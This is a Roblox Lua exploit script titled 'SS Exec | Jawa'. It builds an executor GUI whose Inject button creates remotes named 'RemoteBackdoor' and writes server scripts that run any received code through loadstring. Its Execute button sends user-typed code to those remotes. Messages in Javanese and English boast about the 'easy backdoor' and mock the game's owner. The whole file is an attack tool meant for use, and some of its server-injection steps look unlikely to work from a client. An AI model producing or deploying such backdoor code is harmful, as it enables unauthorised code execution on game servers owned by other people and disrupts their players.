local StarterGui = game:GetService("StarterGui")
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 300)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.ZIndex = 2
frame.Parent = gui

local cornerFrame = Instance.new("UICorner")
cornerFrame.CornerRadius = UDim.new(0, 15)
cornerFrame.Parent = frame

local title = Instance.new("TextLabel")
title.Text = "SS Exec | Jawa"
title.Size = UDim2.new(0, 300, 0, 40)
title.Position = UDim2.new(0.5, -150, 0, 10)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextScaled = true
title.Font = Enum.Font.SciFi
title.ZIndex = 2
title.Parent = frame

local scriptInput = Instance.new("TextBox")
scriptInput.Size = UDim2.new(0, 320, 0, 100)
scriptInput.Position = UDim2.new(0, 15, 0, 50)
scriptInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
scriptInput.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptInput.Text = ""
scriptInput.PlaceholderText = "Script here! Made by scz3_dra1"
scriptInput.ClearTextOnFocus = false
scriptInput.Font = Enum.Font.SourceSansBold
scriptInput.TextSize = 16
scriptInput.TextWrapped = true
scriptInput.MultiLine = true
scriptInput.TextXAlignment = Enum.TextXAlignment.Left
scriptInput.TextYAlignment = Enum.TextYAlignment.Top
scriptInput.ZIndex = 3
scriptInput.Parent = frame

local cornerInput = Instance.new("UICorner")
cornerInput.CornerRadius = UDim.new(0, 8)
cornerInput.Parent = scriptInput

local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(0, 120, 0, 40)
executeButton.Position = UDim2.new(1, -140, 1, -50)
executeButton.Text = "Execute"
executeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
executeButton.ZIndex = 3
executeButton.Parent = frame

local cornerExecBtn = Instance.new("UICorner")
cornerExecBtn.CornerRadius = UDim.new(0, 8)
cornerExecBtn.Parent = executeButton

local injectButton = Instance.new("TextButton")
injectButton.Size = UDim2.new(0, 120, 0, 40)
injectButton.Position = UDim2.new(0, 15, 1, -50)
injectButton.Text = "Inject"
injectButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
injectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
injectButton.ZIndex = 3
injectButton.Parent = frame

local cornerInjectBtn = Instance.new("UICorner")
cornerInjectBtn.CornerRadius = UDim.new(0, 8)
cornerInjectBtn.Parent = injectButton

local notification = Instance.new("TextLabel")
notification.Size = UDim2.new(0, 320, 0, 30)
notification.Position = UDim2.new(0, 15, 1, -90)
notification.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
notification.BackgroundTransparency = 0.5
notification.TextColor3 = Color3.fromRGB(255, 255, 255)
notification.Text = ""
notification.TextScaled = true
notification.Font = Enum.Font.SourceSansBold
notification.ZIndex = 4
notification.Parent = frame

local phaseLabel = Instance.new("TextLabel")
phaseLabel.Size = UDim2.new(0, 320, 0, 30)
phaseLabel.Position = UDim2.new(0, 15, 1, -130)  -- Adjusted position to avoid collision
phaseLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
phaseLabel.BackgroundTransparency = 0.5
phaseLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
phaseLabel.Text = "SERVICES: 0"
phaseLabel.TextScaled = true
phaseLabel.Font = Enum.Font.SourceSans
phaseLabel.ZIndex = 4
phaseLabel.Parent = frame

local successCount = 0
local failCount = 0
local totalCount = 0
local testResults = {}

StarterGui:SetCore("SendNotification", {
    Title = "SS Executor | Jawa",
    Text = "SSExec | Inject to connect to the server mas.",
    Duration = 10
})

local function updateNotification(message)
    notification.Text = message
    print(message)
end

local function updatePhase(phaseNumber)
    phaseLabel.Text = "SERVICES: " .. phaseNumber
end

local function createHintRemote()
    local hintRemote = game.ReplicatedStorage:FindFirstChild("HintRemote")
    if not hintRemote then
        hintRemote = Instance.new("RemoteEvent")
        hintRemote.Name = "HintRemote"
        hintRemote.Parent = game.ReplicatedStorage
        print("HintRemote created.")
    else
        print("HintRemote already exists.")
    end
    return hintRemote
end

local function serverHint()
    -- Ensure the RemoteEvent exists
    local hintRemote = createHintRemote()
    local serverHintScript = Instance.new("Script")
    serverHintScript.Name = "ServerHintScript"
    serverHintScript.Source = [[
        local hintRemote = game.ReplicatedStorage:WaitForChild("HintRemote")
        
        local function sendHint(message)
            hintRemote:FireAllClients(message)
        end
        
        sendHint("Iki lho mas, sing ngandika game aman wkwk | SSExec")
    ]]
    
    local serverScriptService = game:FindFirstChild("ServerScriptService")
    if not serverScriptService then
        serverScriptService = Instance.new("Folder")
        serverScriptService.Name = "ServerScriptService"
        serverScriptService.Parent = game
    end
    serverHintScript.Parent = serverScriptService

    print("ServerHintScript created in ServerScriptService bitch")
end

local function createRemoteBackdoor()
    local remoteBackdoor = game.ReplicatedStorage:FindFirstChild("RemoteBackdoor")
    if not remoteBackdoor then
        remoteBackdoor = Instance.new("RemoteFunction")
        remoteBackdoor.Name = "RemoteBackdoor"
        remoteBackdoor.Parent = game.ReplicatedStorage
        updateNotification("RemoteBackdoor created.")
    else
        updateNotification("RemoteBackdoor already exists.")
    end
    return remoteBackdoor
end

local function createRemoteEvent()
    local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
    
    if not remoteEvent then
        -- RemoteEvent doesn't exist
        remoteEvent = Instance.new("RemoteEvent")
        remoteEvent.Name = "RemoteEvent"
        remoteEvent.Parent = game.ReplicatedStorage
        updateNotification("RemoteEvent created.")
    else
        updateNotification("Using existing RemoteEvent.")
    end

    -- Handler :::
    if not remoteEvent:FindFirstChild("RemoteHandler") then
        -- Attach a handler to the existing or newly created RemoteEvent
        remoteEvent.OnServerEvent:Connect(function(player, scriptCode)
            local success, result = pcall(function()
                loadstring(scriptCode)()
            end)
            if success then
                updateNotification("Executed")
                print("| SS ? Jawir! : Sukses mas")
            else
                updateNotification("Failed.")
                warn("| SS ? Jawir! : Wes gagal, iki lho mas: ", result)
            end
        end)
        print("")
    else
        updateNotification("Handler already exists for RemoteEvent.")
    end

    return remoteEvent
end

local function createScriptHandler()
    local serverScript = Instance.new("Script")
    serverScript.Name = "ScriptHandler"
    serverScript.Source = [[
        local remoteBackdoor = game.ReplicatedStorage:FindFirstChild("RemoteBackdoor")
        local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
        
        local function handleScriptExecution(scriptCode)
            local success, result = pcall(function()
                local func = loadstring(scriptCode)
                if func then
                    local output = func()
                    if remoteEvent then
                        remoteEvent:FireAllClients("Script Output: " .. tostring(output))
                    end
                end
            end)
            
            if not success and remoteEvent then
                remoteEvent:FireAllClients("Execution Failed: " .. result)
            end
        end
        
        if remoteBackdoor then
            remoteBackdoor.OnServerInvoke = handleScriptExecution -- Use InvokeServer for RemoteBackdoor
        else
            warn("RemoteBackdoor not found.")
        end

        if remoteEvent then
            remoteEvent.OnServerEvent:Connect(function(player, scriptCode)
                handleScriptExecution(scriptCode)
            end)
        else
            warn("RemoteEvent not found.")
        end

        local hint = Instance.new("Hint")
        hint.Text = "SSExec | Jawa, Easy backdoor lol"
        hint.Parent = game.Workspace
    ]]

    local serverScriptService = game:FindFirstChild("ServerScriptService")
    if not serverScriptService then
        serverScriptService = Instance.new("Folder", game)
        serverScriptService.Name = "ServerScriptService"
    end
    serverScript.Parent = serverScriptService
    updateNotification("ScriptHandler created and injected.")
end

local function createGUIHandler()
    local guiHandler = Instance.new("Script")
    guiHandler.Name = "GUIHandler"
    guiHandler.Source = [[
        local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
        if remoteEvent then
            local function handleGUIExecution(scriptCode)
                local success, result = pcall(function()
                    local func = loadstring(scriptCode)
                    if func then
                        local output = func()
                        remoteEvent:FireAllClients("GUI Output: " .. tostring(output))
                    end
                end)
                
                if not success then
                    remoteEvent:FireAllClients("GUI Execution Failed: " .. result)
                end
            end
            
            remoteEvent.OnServerEvent:Connect(handleGUIExecution)
        else
            warn("RemoteEvent not found.")
        end
    ]]

    local serverScriptService = game:FindFirstChild("ServerScriptService")
    if not serverScriptService then
        serverScriptService = Instance.new("Folder", game)
        serverScriptService.Name = "ServerScriptService"
    end
    guiHandler.Parent = serverScriptService
    updateNotification("GUIHandler created and injected.")
end

local function createServerScriptHandler()
    local serverScriptHandler = Instance.new("Script")
    serverScriptHandler.Name = "ServerScriptHandler"
    serverScriptHandler.Source = [[
        local remoteBackdoor = game.ReplicatedStorage:FindFirstChild("RemoteBackdoor")
        if not remoteBackdoor then
            remoteBackdoor = Instance.new("RemoteFunction")
            remoteBackdoor.Name = "RemoteBackdoor"
            remoteBackdoor.Parent = game.ReplicatedStorage
            print("| SSExec: RemoteBackdoor Created")
        else
            print("| SSExec: RemoteBackdoor already exists.")
        end

        local function handleScriptExecution(player, scriptCode)
            local success, result = pcall(function()
                local func = loadstring(scriptCode)
                if func then
                    local output = func()
                    remoteBackdoor:InvokeClient(player, "Script Output: " .. tostring(output))
                end
            end)
            
            if not success then
                remoteBackdoor:InvokeClient(player, "Execution Failed: " .. result)
            end
        end

        remoteBackdoor.OnServerInvoke = handleScriptExecution
        print("| SSExec Handler: Running and listening for events.")
    ]]

    local serverScriptService = game:FindFirstChild("ServerScriptService")
    if not serverScriptService then
        serverScriptService = Instance.new("Folder", game)
        serverScriptService.Name = "ServerScriptService"
    end
    serverScriptHandler.Parent = serverScriptService
    updateNotification("ServerScriptHandler created and injected.")
end

local function testService(serviceName)
    local success, result = pcall(function()
        local service = game:GetService(serviceName)
        local function getPath(instance)
            local parts = {}
            while instance and instance ~= game do
                table.insert(parts, 1, instance.Name)
                instance = instance.Parent
            end
            return table.concat(parts, "/")
        end
        if service then
            local path = getPath(service)
            print(serviceName .. " Path:: " .. path)
            return true
        else
            print(serviceName .. " not found.")
            return false
        end
    end)

    if success and result then
        successCount = successCount + 1
    else
        failCount = failCount + 1
    end
    totalCount = totalCount + 1
end

local function scanForBackdoors()
    local found = {}
    local function findScripts(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
                table.insert(found, child)
            end
            findScripts(child)
        end
    end

    local function findRemotes(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(found, child)
            end
            findRemotes(child)
        end
    end

    findScripts(game.ServerScriptService)
    findScripts(game.ReplicatedStorage)
    findRemotes(game.ServerScriptService)
    findRemotes(game.ReplicatedStorage)

    if #found > 0 then
        updateNotification("Potential backdoors found:")
        for _, obj in ipairs(found) do
            updateNotification("Found: " .. obj:GetFullName())
            print("| SSExec, Potential: " .. obj:GetFullName())
        end
    else
        updateNotification("No potential backdoors found.")
        print("No potential backdoors found.")
    end
end

local function ssTest()
    local phases = {
        { "Players", "Workspace", "ReplicatedStorage" },
        { "Lighting", "SoundService", "Teams" },
        { "MarketplaceService", "DataStoreService", "InsertService" },
        { "Chat", "StarterPack", "StarterGui" },
        { "NetworkClient", "NetworkServer", "ScriptContext" },
        { "RunService", "UserInputService", "Players" },
        { "TextService", "StarterCharacterScripts", "HttpService" },
        { "AnalyticsService", "LocalizationService", "TweenService" },
        { "StarterPlayer", "CoreGui", "PathfindingService" },
        { "GuiService", "ContentProvider", "TeleportService" }
    }

    for phaseIndex, phaseServices in ipairs(phases) do
        updatePhase(phaseIndex)
        for _, serviceName in ipairs(phaseServices) do
            testService(serviceName)
        end

        updateNotification("Phase " .. phaseIndex .. " completed.")
        print("===============Results===============")
        print("Phase " .. phaseIndex .. " results:")
        print("Services | Pass: " .. successCount)
        print("Services | Fail: " .. failCount)
    end

    scanForBackdoors()

    if successCount >= 15 then
        updateNotification("Injected.")
        executeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        executeButton.Text = "Execute"
        executeButton.Active = true
    else
        updateNotification("Failed test")
        executeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        executeButton.Text = "Disabled"
        executeButton.Active = false
    end
end

local function executeScript()
    local scriptCode = scriptInput.Text
    if scriptCode and scriptCode ~= "" then
        local remoteBackdoor = createRemoteBackdoor()
        local remoteEvent = createRemoteEvent()

        if remoteBackdoor then
            local success, result = pcall(function()
                remoteBackdoor:InvokeServer(scriptCode) -- Using InvokeServer on RemoteBackdoor
            end)
            if success then
                updateNotification("Executed via RemoteBackdoor")
                print("| SS ? Jawir! : Executed successfully via RemoteBackdoor")
            else
                updateNotification("Execution failed via RemoteBackdoor.")
                print("| SS ? Jawir! : Failed, reason: ", result)
            end
        else
            updateNotification("RemoteBackdoor not found.")
        end

        if remoteEvent then
            local success, result = pcall(function()
                remoteEvent:FireServer(scriptCode) -- Using FireServer on RemoteEvent
            end)
            if success then
                updateNotification("Executed via RemoteEvent")
                print("| SS ? Jawir! : Executed successfully via RemoteEvent")
            else
                updateNotification("Execution failed via RemoteEvent.")
                print("| SS ? Jawir! : Failed, reason: ", result)
            end
        else
            updateNotification("RemoteEvent not found.")
        end
    end
end

local function hintServer(message)
    local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
    if remoteEvent then
        remoteEvent:FireAllClients(message)
    else
        updateNotification("RemoteEvent not found.")
    end
end

local isInjected = false
local isHint = false

local function injectBackdoor()
    if isInjected then
        if isHint then
            print("?server: hint.already.created")
            return
        end
        updateNotification("Already Injected")
        return
    end
    
    -- // Call SSExec Func
    createRemoteBackdoor()
    createRemoteEvent()
    createScriptHandler()
    createGUIHandler()
    createServerScriptHandler()
    
    isInjected = true
    isHint = true
    ssTest()
    serverHint()
end

executeButton.MouseButton1Click:Connect(executeScript)
injectButton.MouseButton1Click:Connect(injectBackdoor)
-- // Ngawuor wkwk
